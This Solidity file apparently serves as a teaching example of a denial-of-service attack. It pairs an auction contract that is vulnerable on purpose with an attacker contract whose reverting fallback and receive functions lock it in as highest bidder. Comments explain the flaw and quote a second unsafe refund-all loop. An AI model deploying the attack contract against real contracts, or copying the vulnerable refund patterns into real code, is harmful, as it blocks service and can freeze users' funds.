pragma solidity ^0.8.0;
contract DenialOfService{
    address payable public highestBidder;
    uint public  highestBid;
    constructor() payable {
        highestBidder = payable(msg.sender);
        highestBid = msg.value;
    }

    function bidAmount()public  payable{
        uint amount = msg.value;
        if(amount > highestBid){
            (bool succes , ) = highestBidder.call{value : amount}("");
            require(succes , "The transaction failed!!");
            highestBid = amount;
            highestBidder = payable(msg.sender);
        }

    }
}

contract DOSAttack{
    DenialOfService targetContract;
    constructor(address _target) payable  {
        targetContract = DenialOfService(_target);
    }
    function attack() public {
        uint minAmount = targetContract.highestBid() + 1 ether ;
        targetContract.bidAmount{value : minAmount  }();
    }

    fallback() external payable {
        require(false);
    }

    receive() external payable {
        require(false);
    }

}

// the serive is getting denies as we have fallback and recieve denying to take the transaction and hence making the contrcat always be the 
// highesest bidder in the DOS contract 

// PS : A DOS attack can also be mounted in the systems where you are trying to pay all of the people at once ,
// this runs to risk of denying all of the users if even one of the transation fails in the process !! :)
// example contract

// address[] private refundAddresses;
// mapping (address => uint) public refunds;

// // bad
// function refundAll() public {
//     for(uint x; x < refundAddresses.length; x++) { // arbitrary length iteration based on how many addresses participated
//         require(refundAddresses[x].send(refunds[refundAddresses[x]])) // doubly bad, now a single failure on send will hold up all funds
//     }
// }
